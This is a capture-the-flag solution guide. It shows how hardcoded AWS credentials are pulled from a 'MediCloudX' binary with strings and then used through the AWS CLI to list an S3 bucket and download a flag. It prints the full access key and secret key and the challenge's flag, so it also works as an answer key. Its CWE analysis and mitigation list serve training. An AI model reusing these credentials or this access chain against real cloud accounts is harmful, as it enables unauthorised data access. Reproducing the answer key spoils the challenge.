# Challenge 05 - MediCloudX Data Exporter - Solution Guide

## Overview

This challenge demonstrates credential extraction from a compiled C binary through reverse engineering techniques. The binary contains hardcoded AWS credentials that can be discovered through static and dynamic analysis.

## Vulnerability Summary

**CVE Class**: CWE-798 - Use of Hard-coded Credentials  
**Severity**: Critical  
**Impact**: Complete compromise of AWS resources accessible by embedded service account

## Attack Vector

The MediCloudX Data Exporter binary contains:
1. Hardcoded AWS Access Key ID as a string literal
2. AWS Secret Access Key split across multiple variables
3. S3 bucket naming patterns and endpoints
4. Functional AWS API integration for data access

## Step-by-Step Solution

### Step 1: Initial Binary Analysis

First, examine the binary to understand its purpose:

```bash
# Build the binary
make

# Check basic information
file medicloudx_exporter
./medicloudx_exporter --version
```

**Expected Output:**
```
MediCloudX Data Exporter v2.1.3
Build: Release
AWS SDK Integration: Embedded
Security: HIPAA Compliant
```

### Step 2: Extract AWS Access Key

Use the `strings` command to find the AWS Access Key ID:

```bash
strings medicloudx_exporter_linux | grep AKIA
```

**Expected Output:**
```
AKIA5HCACCPUJV4O5PWF
```

This reveals the AWS Access Key ID: `AKIA5HCACCPUJV4O5PWF`

### Step 3: Extract AWS Secret Access Key

Use the `strings` command to find the complete secret key:

```bash
strings medicloudx_exporter_linux | grep xhoGS30hP
```

**Expected Output:**
```
xhoGS30hPE0iNHHpm3Lvz6fSeUX9bqa2zeuwChn7
```

This reveals the complete AWS Secret Access Key: `xhoGS30hPE0iNHHpm3Lvz6fSeUX9bqa2zeuwChn7`

### Step 4: Extract S3 Bucket Pattern

Find the S3 bucket naming pattern:

```bash
strings medicloudx_exporter_linux | grep exporter
```

**Expected Output:**
```
ctf-25-medical-exporter-records-%s
medicloudx_exporter.c
```

This reveals the bucket naming pattern: `ctf-25-medical-exporter-records-[suffix]`

### Step 5: Configure AWS CLI Profile

Create an AWS CLI profile with the extracted credentials:

```bash
aws configure set aws_access_key_id AKIA5HCACCPUJV4O5PWF --profile challenge5
aws configure set aws_secret_access_key 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 --profile challenge5
aws configure set region us-east-1 --profile challenge5
```

**Note:** The bucket suffix for this challenge instance is: `vdd1osgm`

### Step 6: Explore S3 Bucket Structure

List the contents of the S3 bucket:

```bash
aws s3 ls s3://ctf-25-medical-exporter-records-vdd1osgm --profile challenge5
```

**Expected Output:**
```
                           PRE admin/
                           PRE exports/
```

Explore the admin directory:

```bash
aws s3 ls s3://ctf-25-medical-exporter-records-vdd1osgm/admin/ --profile challenge5
```

**Expected Output:**
```
                           PRE system_backup/
```

Check the system_backup directory:

```bash
aws s3 ls s3://ctf-25-medical-exporter-records-vdd1osgm/admin/system_backup/ --profile challenge5
```

**Expected Output:**
```
2025-10-05 16:51:10         51 flag.txt
```

### Step 7: Download and Read the Flag

Download the flag file:

```bash
aws s3 cp s3://ctf-25-medical-exporter-records-vdd1osgm/admin/system_backup/flag.txt ./ --profile challenge5
```

**Expected Output:**
```
download: s3://ctf-25-medical-exporter-records-vdd1osgm/admin/system_backup/flag.txt to ./flag.txt
```

Read the flag:

```bash
cat flag.txt
```

**Flag:** `CTF{m3d1cl0udx_r3v3rs3_3ng1n33r1ng_4ws_cr3d3nt14ls}`

## Complete Solution Summary

The challenge can be solved using simple static analysis:

```bash
# Extract AWS Access Key
strings medicloudx_exporter_linux | grep AKIA
# Result: AKIA5HCACCPUJV4O5PWF

# Extract AWS Secret Access Key
strings medicloudx_exporter_linux | grep xhoGS30hP
# Result: xhoGS30hPE0iNHHpm3Lvz6fSeUX9bqa2zeuwChn7

# Extract bucket pattern
strings medicloudx_exporter_linux | grep exporter
# Result: ctf-25-medical-exporter-records-%s

# Configure AWS CLI
aws configure set aws_access_key_id AKIA5HCACCPUJV4O5PWF --profile challenge5
aws configure set aws_secret_access_key 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 --profile challenge5
aws configure set region us-east-1 --profile challenge5

# Navigate and download flag
aws s3 ls s3://ctf-25-medical-exporter-records-vdd1osgm --profile challenge5
aws s3 ls s3://ctf-25-medical-exporter-records-vdd1osgm/admin/ --profile challenge5
aws s3 ls s3://ctf-25-medical-exporter-records-vdd1osgm/admin/system_backup/ --profile challenge5
aws s3 cp s3://ctf-25-medical-exporter-records-vdd1osgm/admin/system_backup/flag.txt ./ --profile challenge5
cat flag.txt
```

## Technical Analysis

### Vulnerability Details

1. **Hard-coded Credentials (CWE-798)**
   - AWS credentials embedded as string literals
   - No encryption or obfuscation applied
   - Credentials visible in binary without special tools

2. **Information Disclosure (CWE-200)**  
   - Bucket naming patterns exposed in binary
   - Service endpoints and API calls visible
   - Authentication methods discoverable

3. **Insufficient Access Controls (CWE-284)**
   - Service account has broad S3 permissions
   - No runtime authentication required
   - Administrative files accessible via standard user account

### Security Implications

- **Complete AWS Account Compromise**: Extracted credentials provide full access to S3 resources
- **Data Exfiltration**: All patient records and administrative files can be accessed
- **Privilege Escalation**: Service account may have additional AWS permissions
- **Compliance Violation**: HIPAA violations due to inadequate access controls

## Mitigation Recommendations

1. **Remove Hard-coded Credentials**
   - Use AWS IAM roles and temporary credentials
   - Implement environment variables or secure key management
   - Use AWS Systems Manager Parameter Store or AWS Secrets Manager

2. **Implement Runtime Authentication**
   - Require user authentication before AWS access
   - Use multi-factor authentication for administrative functions
   - Implement session management and token expiration

3. **Apply Principle of Least Privilege**
   - Restrict service account permissions to minimum required
   - Separate read-only and administrative access
   - Implement resource-level access controls

4. **Add Binary Protection**
   - Implement code obfuscation for sensitive applications
   - Use binary packing or encryption
   - Add anti-debugging and tamper detection

5. **Monitor and Audit**
   - Log all AWS API calls using CloudTrail
   - Monitor for unusual access patterns
   - Implement automated security scanning for binaries

## Tools Used

- **Static Analysis**: strings
- **Cloud Tools**: AWS CLI

## Learning Objectives

This challenge demonstrates:
- Basic reverse engineering techniques
- Credential extraction from compiled binaries
- Cloud security misconfigurations
- AWS IAM and S3 security principles
- Static vs dynamic analysis approaches

## References

- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [OWASP: Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)  
- [AWS Security Best Practices](https://docs.aws.amazon.com/security/)
